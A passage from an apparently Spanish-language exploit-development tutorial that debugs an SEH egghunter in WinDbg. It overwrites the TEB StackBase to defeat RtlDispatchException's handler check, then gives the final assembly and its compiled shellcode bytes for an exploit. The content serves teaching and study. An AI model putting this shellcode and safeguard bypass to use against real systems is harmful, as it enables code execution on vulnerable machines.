eip=0367eab0 esp=0367ea28 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367eab0 59              pop     ecx

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=00000000 ecx=00000002 edx=77d71670 esi=019029d0 edi=0041703c  
eip=0367eab1 esp=0367ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367eab1 89df            mov     edi,ebx

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=00000000 ecx=00000002 edx=77d71670 esi=019029d0 edi=00000000  
eip=0367eab3 esp=0367ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367eab3 f3af            repe scas dword ptr es:[edi]

</span><span class="ro">0:000> </span><span class="p">p
(1680.12f8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=74303077 ebx=00000000 ecx=00000002 edx=77d71670 esi=019029d0 edi=00000000  
eip=0367eab3 esp=0367ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246  
0367eab3 f3af            repe scas dword ptr es:[edi]</span>
</code></pre></div></div><br>

<p class="plain-text">Al ocurrir una excepción deberia saltar al controlador <code class="language-plaintext highlighter-rouge">0x0367eac6</code> que definimos antes, sin embargo al establecer un <code class="language-plaintext highlighter-rouge">breakpoint</code> en este y correr el programa nos damos cuenta que nunca llega, algo esta haciendo que el egghunter falle</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
0367ea2c: 0367eac6
Invalid exception stack at ffffffff

</span><span class="ro">0:000> </span><span class="p">bp 0x0367eac6

</span><span class="ro">0:000> </span><span class="p">g
(1680.12f8): Access violation - code c0000005 (!!! second chance !!!)
eax=74303077 ebx=00000000 ecx=00000002 edx=77d71670 esi=019029d0 edi=00000000  
eip=0367eab3 esp=0367ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246  
0367eab3 f3af            repe scas dword ptr es:[edi]</span>
</code></pre></div></div><br>

<p class="plain-text">Para entender el porque necesitamos cargar el <code class="language-plaintext highlighter-rouge">ntdll.dll</code> en IDA, sabemos que cuando ocurre una excepciónn se llama a <code class="language-plaintext highlighter-rouge">KiUserExceptionDispatcher</code>, esta función llamará a <code class="language-plaintext highlighter-rouge">RtlDispatchExceptión</code> que obtendrá y analizará la <code class="language-plaintext highlighter-rouge">ExceptionList</code></p>
<a href="/exploitdevelopment/user-mode/egghunters/5.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/5.png"></p></div></a>

<p class="plain-text">Podemos confirmar que se llama a <code class="language-plaintext highlighter-rouge">RtlDispatchException</code>, cuando ocurre la excepción establecemos el <code class="language-plaintext highlighter-rouge">breakpoint</code> y seguimos el flujo, logramos llegar a el</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp ntdll!RtlDispatchException

</span><span class="ro">0:000> </span><span class="p">g
(1680.12f8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=74303077 ebx=00000000 ecx=00000002 edx=77d71670 esi=019029d0 edi=00000000  
eip=0367eab3 esp=0367ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246  
0367eab3 f3af            repe scas dword ptr es:[edi]

</span><span class="ro">0:000> </span><span class="p">g
Breakpoint 1 hit
eax=74303077 ebx=0367e5c0 ecx=0367e5dc edx=77d71670 esi=019029d0 edi=00000000  
eip=77d26a10 esp=0367e5ac ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
ntdll!RtlDispatchException:
77d26a10 8bff            mov     edi,edi</span>
</code></pre></div></div><br>

<p class="plain-text">Mirando los bloques de <code class="language-plaintext highlighter-rouge">RtlDispatchException</code> podemos ver uno que llama a <code class="language-plaintext highlighter-rouge">RtlpGetStackLimits</code>, esto se utiliza para recuperar los limites de la pila, la estructura <code class="language-plaintext highlighter-rouge">TEB</code> tiene los valores <code class="language-plaintext highlighter-rouge">StackBase</code> y <code class="language-plaintext highlighter-rouge">StackLimit</code> justo después de <code class="language-plaintext highlighter-rouge">ExceptionList</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_NT_TIB
ntdll!_NT_TIB
   +0x000 ExceptionList        : Ptr32 _EXCEPTION_REGISTRATION_RECORD  
   +0x004 StackBase            : Ptr32 Void
   +0x008 StackLimit           : Ptr32 Void
   +0x00c SubSystemTib         : Ptr32 Void
   +0x010 FiberData            : Ptr32 Void
   +0x010 Version              : Uint4B
   +0x014 ArbitraryUserPointer : Ptr32 Void
   +0x018 Self                 : Ptr32 _NT_TIB</span>
</code></pre></div></div><br>

<p class="plain-text">El bloque de código establece los registros <code class="language-plaintext highlighter-rouge">edx</code> y <code class="language-plaintext highlighter-rouge">ecx</code> con <code class="language-plaintext highlighter-rouge">lea</code>, los registros se basan en el valor de <code class="language-plaintext highlighter-rouge">esp</code> junto con <code class="language-plaintext highlighter-rouge">2</code> variables estaticas justo antes de la llamada, la funcion devuelve los valores <code class="language-plaintext highlighter-rouge">StackBase</code> y <code class="language-plaintext highlighter-rouge">StackLimit</code> por lo que asumimos que <code class="language-plaintext highlighter-rouge">edx</code> y <code class="language-plaintext highlighter-rouge">ecx</code> contendrán direcciones de memoria utilizadas para almacenar los valores, despues de la llamada el valor asignado a <code class="language-plaintext highlighter-rouge">ExceptionList</code> se mueve a <code class="language-plaintext highlighter-rouge">esi</code></p>
<a href="/exploitdevelopment/user-mode/egghunters/6.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/6.png"></p></div></a>

<p class="plain-text">En la función <code class="language-plaintext highlighter-rouge">RtlpGetStackLimits</code> se mueve una dereferencia de <code class="language-plaintext highlighter-rouge">fs:[0x18]</code> a <code class="language-plaintext highlighter-rouge">eax</code>, en el offset <code class="language-plaintext highlighter-rouge">0x18</code> de la estructura <code class="language-plaintext highlighter-rouge">TEB</code> tenemos a Self que contiuene una dirección de la memoria virtual, despues de que la TEB se almacena en <code class="language-plaintext highlighter-rouge">eax</code>, se ejecutan 2 dereferencias más, la primera de <code class="language-plaintext highlighter-rouge">[eax + 0x4]</code> (StackBase) y se almacena en <code class="language-plaintext highlighter-rouge">esi</code>, la segunda <code class="language-plaintext highlighter-rouge">[eax + 0x8]</code> (StackLimit) y se almacena en <code class="language-plaintext highlighter-rouge">eax</code>, ambas se escriben en las direcciones apuntadas por <code class="language-plaintext highlighter-rouge">edx</code> y <code class="language-plaintext highlighter-rouge">ecx</code> establecidas antes de la llamada</p>
<a href="/exploitdevelopment/user-mode/egghunters/7.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/7.png"></p></div></a>

<p class="plain-text">Volviendo al bloque donde se llama a <code class="language-plaintext highlighter-rouge">RtlpGetStackLimits</code> observamos que se guardan nuevamente <code class="language-plaintext highlighter-rouge">StackBase</code> y <code class="language-plaintext highlighter-rouge">StackLimit</code>, esta vez en <code class="language-plaintext highlighter-rouge">edi</code> y <code class="language-plaintext highlighter-rouge">ebx</code></p>
<a href="/exploitdevelopment/user-mode/egghunters/8.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/8.png"></p></div></a>

<p class="plain-text">Establecemos un breakpoint en el primer <code class="language-plaintext highlighter-rouge">mov</code> y seguimos ejecutando hasta llegar al salto, los valores de <code class="language-plaintext highlighter-rouge">edi</code> y <code class="language-plaintext highlighter-rouge">ebx</code> coinciden con los de <code class="language-plaintext highlighter-rouge">StackBase</code> y <code class="language-plaintext highlighter-rouge">StackLimit</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp ntdll + 0x46ad1

</span><span class="ro">0:000> </span><span class="p">g
Breakpoint 2 hit
eax=00000000 ebx=0367e5dc ecx=0367e4fc edx=77d71670 esi=0367ea2c edi=00000000
eip=77d26ad1 esp=0367e518 ebp=0367e5a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0xc1:
77d26ad1 8b7c2420        mov     edi,dword ptr [esp+20h] ss:0023:0367e538=0367c000

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=0367e5dc ecx=0367e4fc edx=77d71670 esi=0367ea2c edi=0367c000
eip=77d26ad5 esp=0367e518 ebp=0367e5a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0xc5:
77d26ad5 8b5c2428        mov     ebx,dword ptr [esp+28h] ss:0023:0367e540=03680000

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=03680000 ecx=0367e4fc edx=77d71670 esi=0367ea2c edi=0367c000
eip=77d26ad9 esp=0367e518 ebp=0367e5a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0xc9:
77d26ad9 7553            jne     ntdll!RtlDispatchException+0x11e (77d26b2e) [br=0]  

</span><span class="ro">0:000> </span><span class="p">r ebx; r edi
ebx=03680000
edi=0367c000

</span><span class="ro">0:000></span><span class="p"> !teb
TEB at 00287000
    ExceptionList:        0367ea2c
    StackBase:            03680000
    StackLimit:           0367c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00287000
    EnvironmentPointer:   00000000
    ClientId:             00001680 . 000012f8
    RpcHandle:            00000000
    Tls Storage:          00650cf0
    PEB Address:          00282000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0</span>
</code></pre></div></div><br>

<p class="plain-text">Tambien encontramos una llamada a <code class="language-plaintext highlighter-rouge">RtlIsValidHandle</code> que se encarga de hacer varias comprobaciones, siguiendo los bloques de codigo no hay otrea llamada a esta función por lo que tenemos que llegar a este bloque para que el handler funcione</p>
<p class="plain-text">Antes de llegar a este bloque necesitamos pasar varias comprobaciones, los registros usados en los <code class="language-plaintext highlighter-rouge">cmp</code> coinciden con los que contenian <code class="language-plaintext highlighter-rouge">StackLimit</code> y <code class="language-plaintext highlighter-rouge">StackBase</code> sin embargo para asegurar que no se alteran es revisar bloque por bloque</p>
<a href="/exploitdevelopment/user-mode/egghunters/9.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/9.png"></p></div></a>

<p class="plain-text">Esto puede ser un proceso tedioso, para acelerarlo establecemos el primer breakpoint en <code class="language-plaintext highlighter-rouge">ntdll + 0x46b45</code>, si llega ahi podemos asumir que no hay problema con bloques anteriores, afortunadamente alcanzamos el breakpoint, ahora estamos en la primera de varias comprobaciones, si las pasamos llegaremos a la llamada de la función</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp ntdll + 0x46b45

</span><span class="ro">0:008> </span><span class="p">g
Breakpoint 3 hit
eax=00000001 ebx=03680000 ecx=0367ea2c edx=77dfbad4 esi=0367e5c0 edi=0367c000  
eip=77d26b45 esp=0367e518 ebp=0367e5a8 iopl=0         nv up ei pl nz ac pe cy  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217  
ntdll!RtlDispatchException+0x135:
77d26b45 3bcf            cmp     ecx,edi</span>
</code></pre></div></div><br>

<p class="plain-text">En la primera comprobacion el codigo intenta determinar si la estructura <code class="language-plaintext highlighter-rouge">SEH</code> se encuentra en una direccion superior a la de <code class="language-plaintext highlighter-rouge">StackLimit</code>, debido a que el egghunter empujo la estructura SEH al stack y luego sobrescribio el <code class="language-plaintext highlighter-rouge">ExceptionList</code> con el valor del <code class="language-plaintext highlighter-rouge">esp</code> pasamos esta comprobación y podemos pasar a la siguiente comparacion</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r ecx; r edi
ecx=0367ea2c
edi=0367c000

</span><span class="ro">0:000></span><span class="p"> !teb
TEB at 00287000
    ExceptionList:        0367ea2c
    StackBase:            03680000
    StackLimit:           0367c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00287000
    EnvironmentPointer:   00000000
    ClientId:             00001680 . 000012f8
    RpcHandle:            00000000
    Tls Storage:          00650cf0
    PEB Address:          00282000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0</span>
</code></pre></div></div><br>

<p class="plain-text">El siguiente bloque inicia con una instruccion lea que guarda <code class="language-plaintext highlighter-rouge">[ecx + 0x8]</code> en <code class="language-plaintext highlighter-rouge">eax</code>, el resultado de esto es que <code class="language-plaintext highlighter-rouge">eax</code> almacena la direccion de <code class="language-plaintext highlighter-rouge">ExceptionList + 0x8</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000001 ebx=03680000 ecx=0367ea2c edx=77dfbad4 esi=0367e5c0 edi=0367c000  
eip=77d26b4d esp=0367e518 ebp=0367e5a8 iopl=0         nv up ei pl nz na po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202  
ntdll!RtlDispatchException+0x13d:
77d26b4d 8d4108          lea     eax,[ecx+8]

</span><span class="ro">0:000> </span><span class="p">r eax
eax=00000001

</span><span class="ro">0:000> </span><span class="p">? ecx + 8
Evaluate expression: 57141812 = 0367ea34

</span><span class="ro">0:000> </span><span class="p">p
eax=0367ea34 ebx=03680000 ecx=0367ea2c edx=77dfbad4 esi=0367e5c0 edi=0367c000  
eip=77d26b50 esp=0367e518 ebp=0367e5a8 iopl=0         nv up ei pl nz na po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202  
ntdll!RtlDispatchException+0x140:
77d26b50 3bc3            cmp     eax,ebx

</span><span class="ro">0:000> </span><span class="p">r eax
eax=0367ea34</span>
</code></pre></div></div><br>

<p class="plain-text">La siguiente comparacion es de <code class="language-plaintext highlighter-rouge">eax</code> y <code class="language-plaintext highlighter-rouge">ebx1</code>, <code class="language-plaintext highlighter-rouge">eax</code> contiene el valor calculado y <code class="language-plaintext highlighter-rouge">ebx</code> <code class="language-plaintext highlighter-rouge">StackBase</code>, esta comprueba si la dirección de <code class="language-plaintext highlighter-rouge">ExceptionList + 0x8</code> se encuentra en una dirección menor a <code class="language-plaintext highlighter-rouge">StackBase</code>, la razon por la que añade <code class="language-plaintext highlighter-rouge">0x8</code> es que es el tamaño de la estructura <code class="language-plaintext highlighter-rouge">_EXCEPTION_REGISTRATION_RECORD</code> que consta de <code class="language-plaintext highlighter-rouge">2 dwords</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=0367ea34 ebx=03680000 ecx=0367ea2c edx=77dfbad4 esi=0367e5c0 edi=0367c000  
eip=77d26b50 esp=0367e518 ebp=0367e5a8 iopl=0         nv up ei pl nz na po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202  
ntdll!RtlDispatchException+0x140:
77d26b50 3bc3            cmp     eax,ebx

</span><span class="ro">0:000> </span><span class="p">r eax; r ebx
eax=0367ea34
ebx=03680000

</span><span class="ro">0:000> </span><span class="p">!teb
TEB at 00287000
    ExceptionList:        0367ea2c
    StackBase:            03680000
    StackLimit:           0367c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00287000
    EnvironmentPointer:   00000000
    ClientId:             00001680 . 000012f8
    RpcHandle:            00000000
    Tls Storage:          00650cf0
    PEB Address:          00282000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0</span>
</code></pre></div></div><br>

<p class="plain-text">La siguiente instruccion es un <code class="language-plaintext highlighter-rouge">test</code> entre el primer byte de <code class="language-plaintext highlighter-rouge">ecx</code> y el valor de <code class="language-plaintext highlighter-rouge">0x03</code>, esta instruccion es para confirmar que la direccion de memoria de la estructura <code class="language-plaintext highlighter-rouge">_EXCEPTION_REGISTRATION_RECORD</code> esta alineada con el limite de <code class="language-plaintext highlighter-rouge">4</code> bytes, ya que no hemos realizado operaciones aritmeticas en esp la alineacion no deberia alterarse</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=0367ea34 ebx=03680000 ecx=0367ea2c edx=77dfbad4 esi=0367e5c0 edi=0367c000  
eip=77d26b58 esp=0367e518 ebp=0367e5a8 iopl=0         nv up ei ng nz na po cy  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283  
ntdll!RtlDispatchException+0x148:
77d26b58 f6c103          test    cl,3

</span><span class="ro">0:000> </span><span class="p">!teb
TEB at 00287000
    ExceptionList:        0367ea2c
    StackBase:            03680000
    StackLimit:           0367c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00287000
    EnvironmentPointer:   00000000
    ClientId:             00001680 . 000012f8
    RpcHandle:            00000000
    Tls Storage:          00650cf0
    PEB Address:          00282000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0

</span><span class="ro">0:000> </span><span class="p">? cl & 0x03
Evaluate expression: 0 = 00000000</span>
</code></pre></div></div><br>

<p class="plain-text">El programa obtiene la dirección de la función <code class="language-plaintext highlighter-rouge">_except_handler</code> y comprueban si se encuentra en una dirección mayor a la de <code class="language-plaintext highlighter-rouge">StackBase</code>, esta se implementa porque la pila solo debe contener datos, las funciones pueden leer o escribir en ella pero no deberia tener código ejecutable, debido a que <code class="language-plaintext highlighter-rouge">_except_handler</code> esta iumplementada en el egghunter localizado en la pila no pasamos esta comprobación por lo que no alcanzaremos la llamada a la función <code class="language-plaintext highlighter-rouge">RtlIsValidHandle</code> donde esperabamos llegar</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=0367ea34 ebx=03680000 ecx=0367ea2c edx=77dfbad4 esi=0367e5c0 edi=0367c000
eip=77d26b61 esp=0367e518 ebp=0367e5a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0x151:
77d26b61 8b4904          mov     ecx,dword ptr [ecx+4] ds:0023:0367ea30=0367eac6  

</span><span class="ro">0:008> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD @ecx
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x0367eac6     _EXCEPTION_DISPOSITION  +367eac6

</span><span class="ro">0:000> </span><span class="p">p
eax=0367ea34 ebx=03680000 ecx=0367eac6 edx=77dfbad4 esi=0367e5c0 edi=0367c000
eip=77d26b64 esp=0367e518 ebp=0367e5a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0x154:
77d26b64 3bcb            cmp     ecx,ebx

</span><span class="ro">0:000> </span><span class="p">r ecx; r ebx
ecx=0367eac6
ebx=03680000

</span><span class="ro">0:000></span><span class="p"> !teb
TEB at 00287000
    ExceptionList:        0367ea2c
    StackBase:            03680000
    StackLimit:           0367c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00287000
    EnvironmentPointer:   00000000
    ClientId:             00001680 . 000012f8
    RpcHandle:            00000000
    Tls Storage:          00650cf0
    PEB Address:          00282000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0</span>
</code></pre></div></div><br>

<p class="plain-text">Para pasar la comprabación podemos sobrescribir el <code class="language-plaintext highlighter-rouge">StackBase</code> con un valor que tendria que ser menor que nuestra función <code class="language-plaintext highlighter-rouge">_except_handler</code> pero superior a la estructura <code class="language-plaintext highlighter-rouge">_EXCEPTION_REGISTRATION_RECORD</code>, el egghunter ya toma la funcion <code class="language-plaintext highlighter-rouge">_except_handler</code> dinamicamente por lo que podriamos restarle <code class="language-plaintext highlighter-rouge">4</code> bytes y usarlo para sobrescribir <code class="language-plaintext highlighter-rouge">StackBase</code> como se muestra en las ultimas 3 instrucciones añadidas</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">seh</span><span class="p">:
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077        </span><span class="c1">; $eax = "w00t"

        </span><span class="o">pop </span><span class="mi">ecx                    </span><span class="c1">; $ecx = handler
        </span><span class="o">push </span><span class="mi">ecx                   </span><span class="c1">; push handler
        </span><span class="o">push </span><span class="mi">0xffffffff            </span><span class="c1">; push nseh

        </span><span class="o">xor </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">ebx               </span><span class="c1">; $ebx = 0x0
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">fs</span><span class="p">:</span><span class="mi">ebx</span><span class="p">], </span><span class="mi">esp          </span><span class="c1">; overwrite ExceptionList in TEB

        </span><span class="o">sub </span><span class="mi">ecx</span><span class="p">, </span><span class="mi">0x4               </span><span class="c1">; sub 0x4 (SEH Handler > StackBase)
        </span><span class="o">add </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">0x4               </span><span class="c1">; add 0x4 to point to StackBase
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">fs</span><span class="p">:</span><span class="mi">ebx</span><span class="p">], </span><span class="mi">ecx          </span><span class="c1">; overwrite StackBase to pass check</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro <code class="language-plaintext highlighter-rouge">egghunter</code> final se ve de esta forma, solo necesitamos compilarlo y obtenerlo en un formato que podamos usar en <code class="language-plaintext highlighter-rouge">python</code> como hemos hecho antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start</span><span class="p">:

</span><span class="na">_start</span><span class="p">:
    </span><span class="o">jmp .</span><span class="na">addr                      </span><span class="c1">; jmp to call .seh

    </span><span class="o">.</span><span class="na">seh</span><span class="p">:
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077        </span><span class="c1">; $eax = "w00t"

        </span><span class="o">pop </span><span class="mi">ecx                    </span><span class="c1">; $ecx = handler
        </span><span class="o">push </span><span class="mi">ecx                   </span><span class="c1">; push handler
        </span><span class="o">push </span><span class="mi">0xffffffff            </span><span class="c1">; push nseh

        </span><span class="o">xor </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">ebx               </span><span class="c1">; $ebx = 0x0
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">fs</span><span class="p">:</span><span class="mi">ebx</span><span class="p">], </span><span class="mi">esp          </span><span class="c1">; overwrite ExceptionList in TEB

        </span><span class="o">sub </span><span class="mi">ecx</span><span class="p">, </span><span class="mi">0x4               </span><span class="c1">; sub 0x4 (SEH Handler > StackBase)  
        </span><span class="o">add </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">0x4               </span><span class="c1">; add 0x4 to point to StackBase
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">fs</span><span class="p">:</span><span class="mi">ebx</span><span class="p">], </span><span class="mi">ecx          </span><span class="c1">; overwrite StackBase to pass check  

    </span><span class="o">.</span><span class="na">find</span><span class="p">:
        </span><span class="o">push </span><span class="mi">0x2                   </span><span class="c1">; push 0x2
        </span><span class="o">pop </span><span class="mi">ecx                    </span><span class="c1">; $ecx = counter

        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">ebx               </span><span class="c1">; $edi = address
        </span><span class="o">repz scasd                 </span><span class="c1">; cmp eax, [edi]

        </span><span class="o">jnz .</span><span class="na">loop                  </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">jmp </span><span class="mi">edi                    </span><span class="c1">; if zf == 1 -> exec

    </span><span class="o">.</span><span class="na">page</span><span class="p">:
        </span><span class="o">or </span><span class="mi">bx</span><span class="p">, </span><span class="mi">0xfff               </span><span class="c1">; get last address in page

    </span><span class="o">.</span><span class="na">loop</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">ebx                    </span><span class="c1">; increase memory counter
        </span><span class="o">jmp .</span><span class="na">find                  </span><span class="c1">; loop to cmp

    </span><span class="o">.</span><span class="na">addr</span><span class="p">:
        </span><span class="o">call .</span><span class="na">seh                  </span><span class="c1">; call .seh to set handler

        </span><span class="o">push </span><span class="mi">0xc                   </span><span class="c1">; push 0xc
        </span><span class="o">pop </span><span class="mi">ecx                    </span><span class="c1">; $ecx = 0xc
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">esp </span><span class="o">+ </span><span class="mi">ecx</span><span class="p">]       </span><span class="c1">; $eax = structure for exception

        </span><span class="o">mov </span><span class="mi">cl</span><span class="p">, </span><span class="mi">0xb8               </span><span class="c1">; $ecx = offset to eip
        </span><span class="o">add </span><span class="no">dword </span><span class="p">[</span><span class="mi">eax </span><span class="o">+ </span><span class="mi">ecx</span><span class="p">], </span><span class="mi">0x6 </span><span class="c1">; add 0x6 to eip = .page

        </span><span class="o">pop </span><span class="mi">eax                    </span><span class="c1">; $eax = return value
        </span><span class="o">add </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0x10              </span><span class="c1">; clear stack
        </span><span class="o">push </span><span class="mi">eax                   </span><span class="c1">; push return value

        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax               </span><span class="c1">; $eax = 0x0
        </span><span class="o">ret                        </span><span class="c1">; return to .page</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm </span><span class="p">-f elf egghunter.asm -o egghunter.o; </span><span class="ve">ld </span><span class="p">egghunter.o -m elf_i386 -o egghunter

</span><span class="ve">❯ objdump </span><span class="p">-d egghunter | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:'</span><span class="p"> | </span><span class="ve">grep</span><span class="p"> -v </span><span class="am">'egghunter' </span><span class="p">|</span><span class="ve"> cut </span><span class="p">-f2 -d: | </span><span class="ve">cut</span><span class="p"> -f1-6 -d</span><span class="am"> ' ' </span><span class="p">| </span><span class="ve">tr </span><span class="p">-s </span><span class="am">' ' </span><span class="p">| </span><span class="ve">tr </span><span class="am">'\t' ' ' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d </span><span class="am">'' </span><span class="p">-s  
\xeb\x2a\xb8\x77\x30\x30\x74\x59\x51\x6a\xff\x31\xdb\x64\x89\x23\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3  </span>
</code></pre></div></div><br>

<p class="plain-text">Nuevamente ejecutamos el programa y corremos el exploit hasta llegar a la excepción</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(21c0.478): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=02262ca0 ecx=0000000e edx=0454e508 esi=02262ca0 edi=0041703c  
eip=0454ea8d esp=0454ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
0454ea8d cc              int     3

</span><span class="ro">0:000> </span><span class="p">g
(21c0.478): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=74303077 ebx=00000004 ecx=00000002 edx=0454e508 esi=02262ca0 edi=00000004  
eip=0454eaac esp=0454ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
0454eaac f3af            repe scas dword ptr es:[edi]</span>
</code></pre></div></div><br>

<p class="plain-text">Igual que antes establecemos un <code class="language-plaintext highlighter-rouge">breakpoint</code> en el controlador pero esta vez si que lo alcanzamos, veamos como funciona el manejo de la excepción que se implementa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
0454ea1c: 0454eabf
Invalid exception stack at ffffffff

</span><span class="ro">0:000> </span><span class="p">bp 0x0454eabf

